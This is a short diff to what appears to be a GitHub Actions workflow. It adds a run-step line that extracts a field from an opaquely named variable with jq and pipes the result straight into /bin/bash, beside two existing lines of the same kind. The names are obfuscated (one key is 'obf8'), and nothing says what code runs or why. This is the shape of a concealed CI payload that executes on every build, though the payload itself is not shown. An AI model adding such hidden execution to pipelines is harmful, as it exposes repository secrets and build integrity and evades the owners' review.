@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$uc4" | jq -r .obf8 | /bin/bash
           echo $ttwy97037 | jq -r .iwxwu791 | /bin/bash
+          printf '%s' "$a0575" | jq -r .magwj4 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
